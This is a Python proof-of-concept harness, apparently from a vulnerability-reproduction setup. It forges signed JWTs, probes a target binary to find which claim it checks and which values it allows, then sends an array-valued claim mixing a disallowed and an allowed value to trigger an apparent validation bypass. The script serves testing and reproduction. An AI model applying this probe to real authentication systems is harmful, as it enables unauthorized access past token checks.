#!/usr/bin/env python3
import argparse
import base64
import hashlib
import hmac
import json
import os
import re
import signal
import subprocess
import sys
import time


MAX_CAPTURE = 65536
DISALLOWED_VALUE = "https://codex.invalid/disallowed-issuer"
FALLBACK_ALLOWED_ISSUER = "https://valid-iss"


def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def json_bytes(value):
    return json.dumps(value, separators=(",", ":"), sort_keys=True).encode("utf-8")


def make_jwt(payload, secret):
    header = {"alg": "HS256", "typ": "JWT"}
    encoded_header = b64url(json_bytes(header))
    encoded_payload = b64url(json_bytes(payload))
    signing_input = f"{encoded_header}.{encoded_payload}".encode("ascii")
    signature = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
    return f"{encoded_header}.{encoded_payload}.{b64url(signature)}"


def stable_secret(binary):
    try:
        st = os.stat(binary)
        seed = f"{os.path.abspath(binary)}\0{st.st_size}\0{st.st_mtime_ns}"
    except OSError:
        seed = os.path.abspath(binary)
    return "poc-secret-" + hashlib.sha256(seed.encode("utf-8")).hexdigest()[:32]


def coerce_text(value):
    if value is None:
        return ""
    if isinstance(value, bytes):
        return value.decode("utf-8", "replace")
    return str(value)


def truncate(value):
    if len(value) <= MAX_CAPTURE:
        return value
    return value[:MAX_CAPTURE] + "\n...[truncated]..."


def signal_name(returncode):
    if returncode is None or returncode >= 0:
        return None
    try:
        return signal.Signals(-returncode).name
    except ValueError:
        return f"SIG{-returncode}"


def run_target(binary, token, secret, timeout):
    command = [binary, "--token", token, "--key", secret]
    started = time.monotonic()
    try:
        completed = subprocess.run(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=timeout,
        )
        runtime_ms = int((time.monotonic() - started) * 1000)
        return {
            "command": command,
            "returncode": completed.returncode if completed.returncode >= 0 else None,
            "raw_returncode": completed.returncode,
            "signal": signal_name(completed.returncode),
            "timed_out": False,
            "runtime_ms": runtime_ms,
            "stdout": coerce_text(completed.stdout),
            "stderr": coerce_text(completed.stderr),
            "process_error": None,
        }
    except subprocess.TimeoutExpired as exc:
        runtime_ms = int((time.monotonic() - started) * 1000)
        return {
            "command": command,
            "returncode": None,
            "raw_returncode": None,
            "signal": None,
            "timed_out": True,
            "runtime_ms": runtime_ms,
            "stdout": coerce_text(exc.stdout),
            "stderr": coerce_text(exc.stderr),
            "process_error": {"code": "TIMEOUT", "message": f"target exceeded timeout of {timeout} seconds"},
        }
    except OSError as exc:
        runtime_ms = int((time.monotonic() - started) * 1000)
        return {
            "command": command,
            "returncode": None,
            "raw_returncode": None,
            "signal": None,
            "timed_out": False,
            "runtime_ms": runtime_ms,
            "stdout": "",
            "stderr": "",
            "process_error": {"code": "EXEC_ERROR", "message": str(exc)},
        }


def parse_result_json(stdout):
    text = stdout.strip()
    if not text:
        return None
    try:
        parsed = json.loads(text)
    except json.JSONDecodeError:
        return None
    return parsed if isinstance(parsed, dict) else None


def read_binary_bytes(path):
    try:
        with open(path, "rb") as handle:
            return handle.read()
    except OSError:
        return b""


def quoted_strings(blob):
    values = []
    try:
        text = blob.decode("utf-8", "ignore")
    except Exception:
        return values
    for match in re.finditer(r"""["']([^"'\\\x00-\x1f]{1,160})["']""", text):
        values.append(match.group(1))
    return values


def discover_static_candidates(binary):
    blob = read_binary_bytes(binary)
    by_claim = {claim: [] for claim in ("iss", "sub", "jti", "nonce", "aud")}
    if not blob:
        return by_claim, []

    text = blob.decode("utf-8", "ignore")
    option_to_claim = {
        "allowedIss": "iss",
        "allowedSub": "sub",
        "allowedJti": "jti",
        "allowedNonce": "nonce",
        "allowedAud": "aud",
    }
    for option, claim in option_to_claim.items():
        for block in re.findall(rf"{option}\s*:\s*\[([^\]]{{0,1000}})\]", text):
            for value in re.findall(r"""["']([^"'\\\x00-\x1f]{1,160})["']""", block):
                by_claim[claim].append(value)

    global_values = []
    for match in re.finditer(r"https?://[A-Za-z0-9._~:/?#\[\]@!$&()*+,;=%-]{1,160}", text):
        global_values.append(match.group(0))

    for value in quoted_strings(blob):
        if value.startswith(("urn:", "acct:")) or value in ("admin", "user", "service"):
            global_values.append(value)

    return by_claim, dedupe(global_values)


def dedupe(values):
    seen = set()
    out = []
    for value in values:
        if not isinstance(value, str) or not value:
            continue
        if value in seen:
            continue
        seen.add(value)
        out.append(value)
    return out


def probe(binary, secret, claim, value, timeout):
    token = make_jwt({claim: value}, secret)
    result = run_target(binary, token, secret, timeout)
    parsed = parse_result_json(result["stdout"])
    return parsed


def claim_rejected_for_claim(parsed, claim):
    if not isinstance(parsed, dict) or parsed.get("ok") is not False:
        return False
    error = parsed.get("error")
    if not isinstance(error, dict):
        return False
    message = str(error.get("message", ""))
    code = str(error.get("code", ""))
    return claim in message or "CLAIM" in code


def discover_claim_policy(binary, secret, timeout):
    static_by_claim, static_global = discover_static_candidates(binary)
    fallback_values = [
        FALLBACK_ALLOWED_ISSUER,
        "https://valid-issuer",
        "valid",
        "admin",
        "user",
        "service",
    ]
    claims = ["iss", "sub", "jti", "nonce", "aud"]

    for claim in claims:
        invalid = probe(binary, secret, claim, DISALLOWED_VALUE, timeout)
        if not claim_rejected_for_claim(invalid, claim):
            continue

        candidates = dedupe(static_by_claim.get(claim, []) + static_global + fallback_values)
        for candidate in candidates[:24]:
            accepted = probe(binary, secret, claim, candidate, timeout)
            if isinstance(accepted, dict) and accepted.get("ok") is True:
                return claim, candidate

    return "iss", FALLBACK_ALLOWED_ISSUER


def choose_trigger_payload(binary, secret, timeout):
    claim, allowed_value = discover_claim_policy(binary, secret, timeout)
    if claim in ("iss", "sub", "jti", "nonce"):
        return {claim: [DISALLOWED_VALUE, allowed_value]}
    return {claim: [DISALLOWED_VALUE, allowed_value]}


def build_report(binary, final_run):
    parsed = parse_result_json(final_run["stdout"])
    stdout = truncate(final_run["stdout"])
    stderr = truncate(final_run["stderr"])

    report = {
        "binary": binary,
        "command": final_run["command"],
        "returncode": final_run["returncode"],
        "signal": final_run["signal"],
        "timed_out": final_run["timed_out"],
        "runtime_ms": final_run["runtime_ms"],
        "stdout": stdout,
        "stderr": stderr,
        "observable": {
            "kind": "stdout",
            "value": "",
            "path": None,
        },
        "error": None,
    }

    if parsed is not None:
        report["observable"]["value"] = json.dumps(parsed, separators=(",", ":"))
        return report

    combined = stdout + stderr
    report["observable"] = {
        "kind": "combined_output",
        "value": combined,
        "path": None,
    }
    report["error"] = final_run["process_error"] or {
        "code": "NO_RESULT_JSON",
        "message": "target did not emit a parseable JSON result on stdout",
    }
    return report


def emit(report, path):
    text = json.dumps(report, separators=(",", ":"), sort_keys=False)
    if path:
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(text)
            handle.write("\n")
    else:
        print(text)


def main(argv):
    parser = argparse.ArgumentParser()
    parser.add_argument("--binary", required=True)
    parser.add_argument("--json-out")
    parser.add_argument("--timeout", type=float, default=30.0)
    args = parser.parse_args(argv)

    secret = stable_secret(args.binary)
    timeout = max(args.timeout, 0.001)
    payload = choose_trigger_payload(args.binary, secret, timeout)
    token = make_jwt(payload, secret)
    final_run = run_target(args.binary, token, secret, timeout)
    report = build_report(args.binary, final_run)
    emit(report, args.json_out)
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main(sys.argv[1:]))
    except Exception as exc:
        fallback = {
            "binary": "",
            "command": [],
            "returncode": None,
            "signal": None,
            "timed_out": False,
            "runtime_ms": 0,
            "stdout": "",
            "stderr": "",
            "observable": {"kind": "custom", "value": "", "path": None},
            "error": {"code": "SCRIPT_ERROR", "message": str(exc)},
        }
        print(json.dumps(fallback, separators=(",", ":")))
        raise SystemExit(0)
